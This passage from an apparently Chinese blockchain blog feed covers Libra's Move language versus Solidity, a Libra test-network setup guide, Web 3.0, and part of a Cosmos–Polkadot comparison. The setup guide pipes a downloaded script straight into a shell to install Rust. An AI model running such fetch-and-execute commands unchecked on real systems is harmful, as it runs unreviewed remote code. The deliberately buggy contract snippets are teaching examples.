Code，在以太坊虚拟机EVM中执行。Solidity是一种高级语言，参考了C++、Python和Javascript的语法，是一种静态类型、图灵完备的语言，支持继承，允许用户自定义复杂的类型。Solidity更像是一种通用的编程语言，理论上可以用来开发任何类型的程序，它没有针对货币或者资产类型的数据，在语法和语义上做任何限制和保护。比如用它来开发一个新的代币合约，代币的余额通常声明为uint类型，如果编码时对余额增减逻辑的处理不够小心，就会使余额变量发生溢出，造成超额铸币、随意增发、下溢增持等严重错误， 如： BEC 智能合约的漏洞。 Libra的Move语言再来看Libra，它定义了一种新的编程语言Move，这种语言主要面向资产类数据，基于Libra所设定的“顶级资源”结构，主要设计目标是灵活性、安全性和可验证性。目前，Move高级语言的语法设计还没有完成，白皮书只给出了Move的中间语言（Move IR）和Move字节码定义。因此我们无法评估最终Move语言对开发者是否友好，但从Move IR的设计中，可以感受到它在安全性和可验证性方面的特点。 Move语言的设计下面我们来简单介绍一下Move的语法。Move的基本封装单元是“模块”（Module），模块有点类似于以太坊中的“智能合约”，或者面向对象语言中的“类”。模块中可以定义“资源”（Resource）和“过程”（Procedure），类似于类中的“成员”(Member)和“方法”(Method)。所有部署在Libra上的模块都是全局的，通过类似于Java中的包名+类名的方式来引用，例如0x001.MyModule，0x001是一个Libra地址，MyModule是一个模块名。模块中的过程有public和private两种可见性，公有过程可以被其他模块调用，私有过程只能被同模块的过程调用。而模块中的资源都是私有的，只有通过公有过程才能被其他模块访问。而且，外部模块或者过程对本模块资源的修改受到严格的限制，唯一允许的操作就是“移动”（Move），不能随意对资源赋值。例如，Move中是不允许出现一个类似于MyCoin.setBalance()这样的接口，让其他用户有机会随意修改某个币种余额的。 除了受限的资源类型，Move模块中也允许定义非受限的成员，被称为非受限类型（Unrestricted Type），包括原生类型（boolean、uint64、address、bytes）和非资源类的结构体（struct）。这些非受限类型就没有那么严格的访问限制，可以用来描述与资产无关的其他应用类数据。从这个角度来说，Move语言理论上应该具有和Solidity同样的描述能力，但由于实际的去中心化应用中，总会涉及到资产类的数据，而任何引用了资源类型的结构体也都是受限的，能够真正脱离Move语言严格限制的机会并不多。所以在实际使用Move语言开发的时候，程序员一定会有一种戴着镣铐跳舞的感觉，代码出现编译时和运行时失败的可能也更大。通俗的说，用Move写代码不会让你感觉“很爽”，这就是安全性和可验证性的代价。想想你用C语言自己控制内存的分配和释放时，虽然有一种“我是上帝”的感觉，但也会时刻忧虑缓冲区溢出、内存泄露等潜在风险；而用Java语言开发，虽然你不再能够为所欲为的控制内存，但也不用担心这些内存安全性问题了。自由还是安全，往往是不兼得的。 在一个Libra的交易（Transaction）中，也可以嵌入一段Move代码，被称为交易脚本（Transaction Script）。这段代码不属于任何模块，是一次性执行的，不能再被其他代码调用。脚本中可以包含多个过程，通过main过程作为入口来执行，在其中也可以调用其他模块中的过程。这个设计有点类似比特币，而和以太坊完全不同。在以太坊中，一个交易本身是不能包含一段可执行代码的，只能部署新合约或者调用一个已部署的合约。我不太喜欢Libra的这个设计，由于任何Move代码都必须经过字节码验证器（Bytecode Verifier）的严格检查才能发布到链上，这种一次性代码的边际成本远远高于可复用的模块，会拖慢交易被确认的速度，降低系统的吞吐量。交易脚本并不是必须的，大部分现实场景都可以通过模块来覆盖，而且，它的存在还增加了Libra钱包的开发和使用难度，有机会的话我会向Libra的开发团队提议取消这一设计。 通过一个交易脚本看Move语言下面我来看一下白皮书中的示例代码片段，直观感受一下Move语言。请注意，这段代码是Move中间语言的（IR），未来Move高级语言肯定会提供一系列语法糖，使代码更加简洁优雅。 12345678// 两个参数public main(payee: address, amount: u64) &#123;// 从sender余额扣除amount个Coin let coin: 0x0.Currency.Coin = 0x0.Currency.withdraw_from_sender(copy(amount)); // 将coin累加到payee的Coin余额中 0x0.Currency.deposit(copy(payee), move(coin));&#125; 这段代码是一个交易脚本，只有一个main过程，实现的是一个叫做Coin的代币转账逻辑，接受一个目标地址和转账金额作为参数，预期执行结果是把amount数量的Coin，从交易发起者的账户转移给address地址。 过程体只有两行，第2行声明了一个coin变量，类型是0x0.Currency.Coin。0x0是部署Currency模块的Libra地址，Coin是一个资源类型，属于Currency模块。这是一个赋值语句，coin的值是调用0x0.Currency模块的withdraw_from_sender()过程获得的。这个过程被执行的时候，会从sender的余额中扣除amount数量的Coin； 第3行调用0x0.Currency模块的另一个过程deposit()，把上面取得的coin这个资源累加到payee地址的余额中。 这段代码的特别之处在于，每个取变量右值的地方都有一个copy()或者move()。这就是Move语言最有特点的地方，它借用了C++ 11和Rust的move语义，要求在读取变量的值时，必须指定取值的方式，要么是copy，要么是move。 两种方式的差别是：用copy的方式取值，相当于把变量克隆出一份，原来的变量值不变，还可以继续使用；而用move的方式取值，原变量的引用，或者说所有权转移给了新的变量，原变量就失效了。 C++中引入move语义的目的，是为了减少不必要的对象拷贝，以及临时变量的构造和析构，提高代码执行效率；而Move语言的目的，是为了通过更严格的语法和语义限制，来提高“资源”变量的安全性。在Move语言中，资源类型只能move，不能copy，而且只能move一次。 假如程序员的咖啡喝完了，状态很差，在写这段代码时出了一个bug，把第3行的move(coin)写成了copy(coin)，会发生什么呢？ 12345public main(payee: address, amount: u64) &#123; let coin: 0x0.Currency.Coin = 0x0.Currency.withdraw_from_sender(copy(amount)); // move(coin) -&gt; copy(coin) 0x0.Currency.deposit(copy(payee), copy(coin));&#125; 由于coin是资源类型，不允许copy，Move的字节码验证器会在第3行报错。 再假如程序员写代码时，他的猫刚好从键盘上走过，踩到了Command和D键，于是，第3行代码重复出现了两次（第4行），又会发生什么呢？ 12345public main(payee: address, amount: u64) &#123; let coin: 0x0.Currency.Coin = 0x0.Currency.withdraw_from_sender(copy(amount)); 0x0.Currency.deposit(copy(payee), move(coin)); 0x0.Currency.deposit(copy(payee), move(coin)); // 猫干的!&#125; 这一次bug更严重，会导致来源地址只扣除了一次金额，而目标地址却增加了双倍的金额。在这个场景下Move的静态检查就真正发挥作用了，由于第一次coin变量经过move取值后已经不可用，那么第二次move(coin)就会引起字节码验证器报错。 在以太坊中就没有那么幸运了，比如下面的代码： 1234567891011121314pragma solidity &gt;=0.5.0 &lt;0.7.0;contract Coin &#123; mapping (address =&gt; uint) public balances; event Sent(address from, address to, uint amount); function send(address receiver, uint amount) public &#123; require(amount &lt;= balances[msg.sender], "Insufficient balance."); balances[msg.sender] -= amount; balances[receiver] += amount; balances[receiver] += amount; // 又是猫干的! emit Sent(msg.sender, receiver, amount); &#125; // ………… &#125; 以太坊是无法找到代码中多出来的一行balances[receiver] += amount;的（第11行）， 每次send()被调用，Coin这个代币的总量都会凭空多出amount个。 Move字节码验证器读到这里，大家应该能够意识到，Move中最核心的组件就是字节码验证器。让我们来看看它是如何对一段Move字节码进行验证的，验证过程通常包括以下步骤： 控制流图构建：这一步会将字节码分解成代码块，并构建它们之间的跳转关系； 栈高度检查：这一步主要是防止栈的越界访问； 类型检查：这一步会通过一个“类型栈”模型来对代码进行类型检查； 资源检查：这一步主要针对资源类型进行安全性检查，防止资源被复制或消毁，并确保-资源变量被后续代码所使用。上文举的例子中的bug，就是在这一步被发现的； 引用检查：这一步参考了Rust的类型系统，对引用进行静态和动态检查。检查是在字节码级别进行的，确保没有悬空的引用（指向未分配内存的引用），以及引用的读写权限是安全的； 全局状态链接：这一步主要检查结构体类型和过程的签名，确保模块的私有过程不会被调用，以及调用的参数列表符合过程的声明。 Move虚拟机Move的虚拟机，和EVM相似的地方比较多。它也是一个基于栈的虚拟机。指令集包含6类指令：数据加载和移动、栈操作/代数运算/逻辑运算、模块成员及资源操作、引用相关操作、控制流操作、区块链相关操作。 与EVM类似，每一条指令都会计算一个gas，耗光gas后代码会停机。Move中，一个交易的代码执行符合原子性，要么全部执行成功，要么一条也不执行。有趣的是，虽然Libra是一个标准的区块链账本结构，所有交易都是全局有序的，但Move语言本身支持并行执行，这意味着，也许以后Libra可以改进成类似Vite的DAG账本，提高交易并行处理的效率。 未来工作当前Move还处于一个比较早起的开发阶段，后续工作包括： 实现Libra链的基本功能，包括账户、Libra代币、准备金管理、验证节点的加入和移除、交易手续费管理、冷钱包等； 新的语言功能，包括范型、容器、事件、合约升级等； 提高开发者体验，包括设计一个人性化的高级语言等； 形式化建模和验证工具； 支持第三方Move模块。 本文如有错误，请读者不吝指正。想获取更多的细节，可以阅读白皮书或开源代码。 顺便说一句，这篇Move白皮书写的相当不错，概念准确，而且通俗易懂，没有使用特别形式化的描述或者复杂的数学知识，一个对区块链技术有所了解的读者完全可以一次读懂。这也从侧面反映出Facebook团队专业和务实的风格。 本文作者：刘春明，Vite Labs创始人，区块链技术专家，中国区块链应用研究中心常务理事。本文转自Vite海盗号：https://www.8btc.com/article/431396 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>Libra</category>
      </categories>
      <tags>
        <tag>Move</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[入门 Facebook Libra - 开发环境搭建]]></title>
    <url>%2F2019%2F06%2F20%2Flibra-init%2F</url>
    <content type="text"><![CDATA[这几天应该都被Libra刷屏了。Facebook Libra将在2020年底会推出。这里暂且不详细来讨论Libra的意义和阶段性影响。目前来看 Libra 满足了人们进入区块链时代的阶段性的需求，至于如何发展持续保持关注。笔者尝试搭建Libra环境。 Libra 相关资源这里列举相关Libra的相关资源链接，仅供参考： Libra官网： https://libra.org/zh-CN/ Libra白皮书： https://libra.org/zh-CN/white-paper/ Libra 技术白皮书： https://developers.libra.org/docs/assets/papers/the-libra-blockchain.pdf Libra 开发者技术文档：https://developers.libra.org/ Libra Github： https://github.com/libra/libra Libra基础环境搭建基于参考 https://developers.libra.org/docs/my-first-transaction来搭建Libra 环境并连接到测试网络。 实验环境 Centos7.5、16C、192G、1000G 系统安装配置基本的系统安装，安装好之后无外乎关闭selinux、防火墙这些基本的配置。这里建议安装好之后设置阿里yum，设置完成后： 1yum update 下载Libra及相关软件安装 下载Libra： 1git clone https://github.com/libra/libra.git 安装 Golang 安装Golang如果单独去下载安装包麻烦的话，那么直接通过wget来下载解压，配置环境变量。 12wget https://studygolang.com/dl/golang/go1.12.5.linux-amd64.tar.gztar -xvf go1.12.5.linux-amd64.tar.gz 配置环境变量。修改/etc/profile文件,路径根据下载安装路径来。 12345vim /etc/profile#添加export GOROOT=/usr/goexport GOPATH=/usr/gopathexport PATH=$PATH:$GOROOT/bin:$GOPATH/bin 安装Rust等相关 安装rust 123curl https://sh.rustup.rs -sSf | shrustup toolchain install nightly-2019-05-22-x86_64-unknown-linux-gnurustup override set nightly-2019-05-22 安装完成后查看版本信息： 1234root@libra libra]# rustc --versionrustc 1.36.0-nightly (50a0defd5 2019-05-21)[root@libra libra]# rustup --versionrustup 1.18.3 (435397f48 2019-05-22) 安装cmake 在官网：https://cmake.org/download/选择对应操作系统版本下载，下载后解压： 123456tar -xvzf cmake-3.15.0-rc2.tar.gzcd cmake-3.15.0-rc2/./bootstrapgmakegmake install以上步骤有点慢，耐心等待~ protocol安装配置 文件下载地址：https://github.com/protocolbuffers/protobuf/releases/tag/v3.6.1 选择对应的版本： 12345678tar -xvf protobuf-all-3.8.0.tar.gzcd protobuf-3.8.0/./configuremakemake checksudo make installprotoc --version# 显示：libprotoc 3.8.0 安装测试Libra环境12cd libra./scripts/dev_setup.sh 显示如下： 123456789101112Installing CMake......CMake is already installedInstalling Go......Go is already installedInstalling Protobuf......Protobuf is already installedFinished installing all dependencies.You should now be able to build the project by running: source /root/.cargo/env cargo build 测试网络脚本运行： 12./scripts/cli/start_cli_testnet.sh# 比较慢耐心等待~~~ 完成后显示如下： 创建账户及账户状态查看根据官网的指导，先查看account内容： 创建账户 Alice、Bob 1234567libra% account create&gt;&gt; Creating/retrieving next account from walletCreated/retrieved account #0 address c94d5411d85442374cc24c0eb0203f1666c9cd681eb4eeedf366905c950c20eelibra% account create&gt;&gt; Creating/retrieving next account from walletCreated/retrieved account #1 address 39c0ff0bdc00b710599e6f4c8c32d2fa873ce360f20b100703eca748e0941f24libra% 通过account list查看内容： 将Libra Coins添加到Alice和Bob的账户。 根据之前的建account顺序，那么0为Alice、1为Bob，110和50为Libra coin。 1234567libra% account mint 0 110&gt;&gt; Minting coinsMint request submittedlibra% account mint 1 52&gt;&gt; Minting coinsMint request submittedlibra% 检查下account 0、1 的余额： 12345libra% query balance 0Balance is: 110libra% query balance 1Balance is: 52libra% 查看账户序列： 1234567ibra% query sequence 0&gt;&gt; Getting current sequence numberSequence number is: 0libra% query sequence 1&gt;&gt; Getting current sequence numberSequence number is: 0libra% 交易根据例子，我们转移10个Libra coin从Alice到Bob： transfer 0 1 10 0是Alice的帐户的索引。 1是Bob的帐户索引。 10是从Alice的账户转移到Bob的账户的Libra的数量。 1transfer 0 1 10 下图清晰显示账户转账后的状态： 总结大致搭建了Libra的环境，根据官方开发文档实现一些基本的功能。在搭建过程中我把相关软件的版本都列举出来，可能会有一些软件版本的问题导致在编译的时候不通过，建议按照列出的版本来安装，后面还有有文章更新，请期待。有兴趣可联系我一块交流。 深入浅出区块链 - 打造高质量区块链技术博客，学习区块链技术都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>Libra</category>
      </categories>
      <tags>
        <tag>Libra</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[理解 Web 3 技术栈及区块链如何助力]]></title>
    <url>%2F2019%2F06%2F19%2Fweb3-blockchain%2F</url>
    <content type="text"><![CDATA[Web 3.0 的技术栈虽然尚未完成开发，但是一个去中心化、透明、安全的Web 3.0 互联网时代即将来临，而区块链技术将是Web 3.0 的主要驱动力。 Web 3.0是什么那么，Web 3.0是什么？跟以中心化服务器为主的Web 1.0和2.0相比，Web 3.0 区块链技术栈的核心是更加以用户为中心的去中心化网络。Web 3.0作为一个透明安全的互联网，提供更加人性化的用户服务。 下面这张图（来自：101 Blockchains）展示了Web 3.0 重要特性： Web 3.0 重要特性 了解这些特性可以更好地掌握Web 3.0 包含的整个概念，Web 3.0有六个重要特性： 万物互联：每个设备都会接入到互联网，获取内容途径不受限制；更强连通性：Web 3.0利用语义元数据为用户提供更强的连通性；点对点网络：去中心化的网络将替代中央管理机构，用户将对他们的数字身份和数据信息有更多地控制权。3D图形：利用虚拟现实(VR)呈现更加真实自然的图像；语义网络：更好地理解信息，不再依靠关键词标签；人工智能：计算机能像人类一样理解信息。 Web 3.0 技术栈当前的Web 2.0已经非常友好，人们在使用过程中不费吹灰之力，要适应复杂的Web 3.0 技术栈，社会需要花费一些的时间来适应，同样开发者的努力也不可或缺。 即便如此，相信大家也将乐于接受 Web 3.0，就像大家在过去20年对Web1.0 、Web 2.0 的包容和开放。将来我们可能需要借助 DApp浏览器 来使用去中心化应用。下面是一个在各种场景下，Web 2.0 及 Web 3.0 的技术对比图。 Web 2.0 与 3.0 技术对比 上面是几个可能的 web 3.0 技术，未来将有更多的去中心化应用取代现有的重量级应用，他们将会和市场的垄断者展开竞争。当然，与之前的应用相比，新应用将具备更完善、更高级的功能。它们如何做得更好及赢得竞争，就交给时间来证明。 不过，Web 2.0 并不会完全销声匿迹。例如，即便出现了更加智能的通信平台，电子邮件也没有消失，不过他的优势已经不在了。 Web 时代演进Web 1.0Web 1.0 在刚开始时步履维艰。因为价格昂贵且设备少见，人们无法接受互联网，如今几乎人手一个可以连接到互联网的手机。专家常将那个时期称为“只读时代”。大多数内容都是由专业人士创建的，而人们只进行阅读。 那时可用的技术都很简单。谷歌还未出现，人们会使用雅虎或AltaVista。这些搜索引擎使用域名来判断搜索结果的相关性。为了在个人之间共享文件，Napster和BitTorrent受到了欢迎。Web 1.0既无社交也没有语义。我们可以称之为“简单网络”。网站只有超链接和书签功能，并且都是静态的。用户只能浏览内容而无法发出任何反馈或评论，和服务器之间没有任何交互。 Web 2.0Web 2.0 具有读写网络内容的交互能力。静态网站被交互式动态网站取代。博客受到了空前的欢迎。维基百科可以看作一个开放式图书馆，可以在其中搜索到所有知识。即时通信消息传递成为用户很平常的事情。 用户之间可以更好的互动，这被称为“社交网络”，而不再是“简单网络”。视频实现流式传输，各种应用如雨后春笋。传统商店都转换为在线商店，以便更好地进行营销。 Web 的发展史 从中心化到去中心化Web 2.0和Web 1.0的最大缺陷之一就是基于客户端/服务器的架构。今天，我们在互联网上的所有个人数据基本上都存储在巨大存储的服务器中，所有数据归私人公司所有，我们的线上身份也不属于自己，比如 Gmail 地址或 Facebook 帐户。因此，这对我们的隐私构成严重威胁。 这种中心化的系统在过去几年中引起了不小的轰动。例如，Facebook的数据泄露事件和Apple iCloud被侵入。太多敏感数据都被公之于众。这些巨头正以各种方式控制着我们的生活。 另一方面，去中心化网络没有数据泄露的威胁。没有人掌握我们直接的私人数据，也没有任何中心服务器。所有数据将分布在整个网络上。这就是区块链技术的魅力所在：一个去中心化、安全和私密的人性化网络。 中心化到去中心化 迈进数据民主准确来说，点对点连接始于1990年，之后当我们开始使用Tor Browser或BitTorrent等共享程序时，它开始进入大众视野。 随着加密货币的变革，区块链将这种基础设施提升到一个全新的层次。现在我们可以在典型的中心化系统中对数据结构进行去中心化处理。 而在web3中，互联网的数据基础设施正在重新设计。但是，我们要知道，区块链并不是这背后的唯一技术，去中心化的网络技术栈中还有很多其他服务。 还有一个原因是区块链应用在存储大数据量方面还并不理想，仍然存在扩容问题，且实际上也并没有所说的那么私密。 Web 3.0 技术架构新的Web 3.0区块链技术栈的基础结构不同于以前，这其中的转变是巨大且细化的。但是，从客户端/服务器过渡为去中心化网络的过程不会太激进。会逐步趋于成熟。因此，要转型应该首先创建部分去中心化的网络，然后向完全去中心化转变。但是我们还应该明白这个现实：尽管去中心化的网络更加安全，但是它们也会比以前更慢。 即使去中心化是大势所趋，但这并不意味着我们将彻底摈弃中心化系统。中心化系统的优势也可以加以利用。 Web 3.0 五层架构 Web 3.0的五层架构 应用层将包括dApp浏览器，应用托管，dApps，业务逻辑和用户界面。服务和组件层该层涵盖了创建和运行dApps层需要的所有重要工具。通常包括数据馈送、链下计算、治理（去中心化自治组织）、状态通道、侧链和钱包。以及非常重要的智能合约，因为它帮助用户摆脱了中介。您不再需要处理信任问题，并且能够以无争端的方式进行贵重物品交易，如金钱、股票、财产甚至通证。 协议层涵盖了不同的共识算法、参与条件、虚拟机等等。区块链技术利用共识算法来确保节点达成协议。 Web 3.0将如何改变我们的生活？ IT巨头现在正在垄断信息。随着我们进入信息时代，信息的价值肯定会飙升。对于这些公司而言，Web 3 技术栈无疑将是一个打击。去中心化的、更民主的网络时代即将到来，我们很快就能看到日常生活因此发生变化。 加密货币已经与银行和政府展开竞争。平台将趋于去信任化，人们的个人信息将不再作为产品销售。 我们已经成为了这些改变的见证者。瑞士城市楚格（Zug）已将所有市民身份登记在以太坊区块链上。 像在大众用户中非常受欢迎海盗湾（Pirate Bay）这样的网站尽管由于版权问题遭到了各国政府的无数次打击（关闭了很多域名）依然安然无恙。 去中心化平台的一个好处：可持续的三方服务生态系统。应用程序开发者可以在去中心化协议的基础 之上 构建有用的产品，而不用担心有一天他们的 API 访问将被关掉，因为没有人能关了它。 用户现在可以睡个好觉,因为他们的私人信息应加密将更加安全。权力下放也将使叛逆的黑客更快乐。 各种应用程序将接替Facebook、Instagram、Twitter、Google drive等主流网站和流行的浏览器。去中心化应用程序必然的趋势。 简而言之，我们所熟知的互联网世界将从根本上发生转变。 结语在区块链的世界中，网络系统的更新迭代是正常的。这个过程仍在推进，并且在不断改良完善，我们期待更好的数字化体验。 对于未来，我们一起来期待吧。 原文链接 深入浅出区块链 - 打造高质量区块链技术博客，学习区块链技术都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>Web3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cosmos 与 波卡 Polkadot 的五大区别]]></title>
    <url>%2F2019%2F06%2F18%2Fcomsmos-vs-polkadot%2F</url>
    <content type="text"><![CDATA[Cosmos 和 Polkadot 都是关注区块链互操作性的项目，关于二者之间的差别已经有过很多讨论。如果你还不熟悉这两个项目，Linda Xie 发过一串推特介绍过这两个项目，可以作为很好的入门材料。 虽然已经有很多文章分析过这两个项目的区别了，但是我认为其中大部分都存在一定的偏向性或者不够详细。通过这篇文章，我会从架构权衡到设计哲学等方面更深入地探讨这两个项目。 为什么要构建一条新的区块链？为什么一些项目要选择从头开始构建一条专门承载应用程序的区块链，而不是以智能合约的形式在现有的区块链上编写应用程序呢？主要有以下两点原因。 首先，现有的智能合约平台不一定能满足应用程序所需的灵活性和可定制性。举例来说，如果你想搭建的应用程序需要自定义的哈希函数，那么把它编写到以太坊上会消耗很多 gas ，因为这个函数每调用一次都需要在以太坊虚拟机内执行一次。一种解决方案是提议将这个函数作为预编译合约添加至以太坊协议内。但是，除非这个函数也广泛应用于其它应用程序，否则这项提议大概率是不会通过的。从头开始编写一条新的区块链，你就可以自由灵活地设计区块链的核心逻辑，以此满足你的应用程序的需求。 其次是自治问题。在智能合约平台上构建的应用程序必须接受平台的治理并遵守其规则，从区块时间和 gas 定价之类影响用户体验的规则，到回滚之类改变状态的决策等等。 但相应的，具有自治能力的链失去了与其它应用程序进行无缝通信的能力，因为应用程序都是搭建在使用不同状态机的区块链上。Cosmos 和 Polkadot 都致力于解决这个问题——Cosmos 采用的是 Hub-and-Zone（中心枢纽-分区） 模型，Polkadot 则采用的是Relay Chain/Parachain（中继链/平行链）模型。 读者需要对这两个项目有一定的了解，本文侧重于梳理二者的不同点。 局部安全 vs 全局安全Cosmos 和 Polkadot 采用的安全模型差别极大。 Polkadot 共享全局安全简单来说，Polkadot 的工作流程如下： Polkadot 的网络架构 平行链（Parachain）是 Polkadot 网络中的区块链。这些链有自己的状态机、自己的规则和自己的区块生产者，即核验人（collators）。每条平行链本质上都是一个独立的状态机，而且可以使用任何类型的特殊功能、共识算法、交易手续费结构等等。在 Polkadot 网络中，所有平行链都有同一条母链，叫做中继链，里面包含了由所有平行链组成的 “全局状态”。中继链拥有自己的共识算法，叫做 GRANDPA 共识（祖父共识），可以迅速将平行链上的区块确定下来。通过这个模型，Polkadot 的平行链实现了 “共享安全性”—— 如果中继链上有 1000 名验证者，具有极高的安全性，凡是连接到这条中继链的平行链都会受益。这样一来，平行链即能拥有自己的状态机并自定义规则，又能与成百上千条平行链一起共享母链的安全性。 这种模型的缺点需要在于由中继链上的验证者来验证平行链上的状态改变。例如，验证者可能会出于某种原因一直拒绝某条链上的核验人提议的区块，而且这条中继链上的区块永远无法被添加进全局状态。为了尽量避免这种情况，Polkadot 对验证者进行混洗，让他们随机验证平行链，降低同一位验证者始终验证同一条平行链的概率。Polkadot 还另设有一类被称为 Fishermen （渔夫）的验证者，他们会不断查验验证者是否存在恶意行为。 Cosmos 独立的局部安全Cosmos 采用了完全不同的网络架构。 Cosmos的网络架构 在 Cosmos 网络中，每条链都是独立运行的，并设有各自的安全机制，而非像 Polkadot 那样采用全局的安全性模型。每条链都有自己的共识机制，而且由单独的验证者来负责保护这条链的安全性。Cosmos 网络使用中心枢纽-分区模型来实现互操作性，每个分区（独立的链）都可以通过中心枢纽（同样是一条独立的链）向其它分区 “发送代币”。这个协议被称为 IBC （跨链通信），是链与链之间通过发送消息实现代币转账的协议。IBC 协议尚在开发之中，最开始先支持代币转账，最终会支持各类消息的跨链传递。 相比于 Polkadot 的架构而言，Cosmos 的架构最大的不同之处在于，每个分区链的状态仅由各自的验证者保护。一个分区想要获得很强的安全性，就需要建立自己的验证者集，这对于小型应用程序来说会比较困难。不过，对于那些想要获得更多控制权的应用程序来说，这是个很大的亮点。例如，币安最开始就是用自己的节点来充当币安链的验证者，来促进去中心化交易所的持续运行。这样一来，币安在测试币安链并增加新功能的时候就有了充分的控制权。我觉得币安不太可能放弃决定哪些交易可以上链的权力，但若要在以太坊或 Polkadot 平台上开发，就不能不放弃这样的权力。正因如此，我认为 Telegram、Facebook 和 Kakao 这类公司会选择构建自己的区块链并掌握其控制权，未来也不太可能与别的链通信。 治理和参与Polkadot 和 Cosmos 之间的第二个主要差别在于治理和参与。 参与规则差异在 Polkadot 网络中，只有一条中继链和一些与这条中继链共享验证者的平行链。根据目前的估算，平行链的数量上限为 100 条，不过未来有可能减少或增加。Polkadot 网络通过拍卖机制来竞拍平行链的使用权——出价最高的人需要在 PoS 系统中锁定一定数量的 DOT （Polkadot 上的原生货币），才可以在一定时间段内拥有所拍得平行链的使用权。这意味着要想使用 Polkadot 上的平行链，需要购买并锁定大量 DOT ，直到不想再使用这条平行链为止。 Cosmos 网络没有设置固定的参与规则——任何人都可以创建中心枢纽或分区。中心枢纽就是具有自治能力的区块链，它专门用来连接其它区块链。这里有两个例子，一个是 Cosmos Hub，最近已由 Tendermint 团队上线；另一个是 Iris Hub，旨在连接主要运行于中国或其它亚洲国家的区块链 。这种中心枢纽-分区模型提高了跨链通信的效率，因为分区链只需要连接到中心枢纽，无需连接到其他每条链上。 中心枢纽-分区模型可以更高效地连接多条链 治理流程差异由于参与规则不同，这两个网络在治理流程上也存在差异。在 Polkadot 网络中，治理决策取决于投票者所质押的 DOT 数量。关于链上投票会有一套正式机制，不过尚未最终确定下来，点击此处可了解最新进展。除了采取以质押量决定投票权重的机制之外，Polkadot 还组建了一个委员会来代表不活跃的权益持有者。委员会最开始由 6 人组成，每两周增加 1 人，直到满 24 人为止。每位委员会成员均通过赞成投票的方式选出。治理流程的具体细节尚未敲定，也就是说有很多方法可以改变中继链的参数，如出块时间、区块奖励等，以及平行链的参与规则。例如，Polkadot 的治理流程可以改变平行链使用权的竞拍机制或所需的 DOT 数量。有一种常见的误解是 DOT 持有者可以通过投票随意弃用某条平行链。实际上，DOT 持有者只能改变参与流程。也就是说一旦竞拍下了某条平行链，在整个租期之内都享有这条链的使用权。 另一方面，Cosmos 网络不存在单一的 “治理”流程。每个中心枢纽和分区都有自己的治理流程，因此没有一套应用于整个系统内所有链的核心规则。我们所说的“Cosmos 治理”指的都是 Cosmos Hub 的治理，即由 Tendermint 团队上线的那条链。Cosmos Hub 的规则是，任何人都可以发送一个文本提议，由 ATOM 持有者进行投票表决，ATOM 的质押量决定了投票权重。想知道提议长什么样子，这里有个例子。如果你想深入了解治理流程的话，可以阅读一下 Chorus One 发布的 Cosmos Hub 治理机制，是不错的了解 Cosmos Hub 治理的入门资料。 跨链通信Polkadot 和 Cosmos 之间的另一个差别是跨链通信协议及其设计目标。Polkadot 旨在实现平行链之间任意的消息传递。也就是说，平行链 A 可以调用平行链 B 中的智能合约，实现与平行链 B 之间的代币转账或是其他类型的通信。Cosmos 则聚焦于跨链资产转移，其协议较为简单。目前，这两种通信协议仍待完善细则，而且尚未构建完成。可以查看 IBC（跨链通信）和 ICMP（平行链之间的跨链通信）这两种协议的细则。 跨链通信所面临的最大挑战不是如何将一条链上的数据在另一条链上表示出来，而是如何处理链分叉和链重组这样的情况。这是 Cosmos 和 Polkadot 在构架设计上最大的差异。 为了确保跨链通信的安全性，Polkadot 采用了两种不同的机制。首先是安全性共享机制，降低了信息交换的难度。 共享安全性的另一个好处是所有平行链都位于同一个安全层级，因此每条链可以彼此信任。为便于理解，我们以以太坊（安全性较高）和 Verge（安全性较低）的交互操作为例。若想在 Verge 链上表示以太坊，我们可以锁定一些以太坊，然后在 Verge 链上生成 ETH-XVG 代币。然而，由于 Verge 链的安全性较低，攻击者可能会向 Verge 链发动 51% 攻击，并向以太坊区块链发送双花交易，就可以取回比实际拥有数量更多的以太币。因此，在互相发送消息的时候，安全性较高的链很难信任安全性较低的链。如果是在安全层级各不相同的链之间互传消息，情况就会变得更加复杂。 从理论上来说，共享安全性是一种保障跨链通信的良好方式。前提是，这种协议要确保能够经常对验证者进行混洗，再随机分配到各条平行链上。这就会造成经典的 “数据可用性问题”，即每次验证者被分配到新的平行链上，就需要下载新链的状态。这是目前区块链领域最大的难题之一，Polkadot 能否解决尚未可知。 其次，Polkadot 引入了 Fisherman（渔夫）的概念，也就是 Polkadot 网络上的 “赏金猎人”，专门监视平行链上的恶意行为。从某种意义上来说，这是抵御恶意行为的“第二道防线”。如果某条平行链的验证者将一个无效块上链，Fisherman 发现后可以向中继链提交证明，将包括所有平行链在内的整个 Polkadot 网络的状态进行回滚。在跨链通信期间，最令我们担心的莫过于一条链在重组，另一条链却运行如常。Polkadot 就避免了这个问题，一旦发现无效块上链，整个网络都会回滚。 Cosmos 采用了完全不同的跨链通信方式。因为每条链上都有自己的验证者，所以很有可能会出现分区中的验证者串谋的情况。也就是说，如果有两个分区需要通信，A 分区需要必须信任 Cosmos Hub（通信枢纽）以及 B 分区中的验证者。从理论上来说，A 分区的人在决定向 B 分区发送信息之前，需要调查一下 B 分区的验证者。不过我觉得实际情况没那么糟糕。 Polychain Labs 或 Zaki Manian 的 iqlusion 等知名验证者节点可能会验证多条链，逐渐建立起良好的声誉。也就是说，当 A 分区的人看到 B 分区是由 Polychain Labs 和 iqlusion 验证的，可能会因此决定信任 B 分区。 然而，即使一条链得到了人们的信任，也有可能被怀有恶意的攻击者控制，出现各种问题。有一段对话中提到了一个很好的例子： 代币分散于不同分区的 Cosmos 网络 假设上图中的小红点代表一种名为 ETM 的代币，即 Ethermint 分区的原生代币。A、B、C 三个分区的用户想要使用 ETM 来运行各自分区内的一些应用程序，而且他们都信任 Ethermint 分区，因此通过跨链通信在各自的分区内接受了一些 ETM 。现在假设 Ethermint 分区的验证者串谋发动双花攻击，任意转移 ETM 代币。这也会对剩余网络造成影响，因为 ETM 代币也存在于其他分区中。不过受波及的只有 Ethermint 或其他分区中的 ETM 代币持有者。Ethermint 分区中的恶意验证者只能毁掉自己的分区，破坏不了其他分区。这就是 Cosmos 架构的目标——确保恶意行为无法影响整个网络。 Polkadot 则不同。如果中继链（全局状态）上发生了无效状态更新，又没被 Fisherman 发现的话，Polkadot 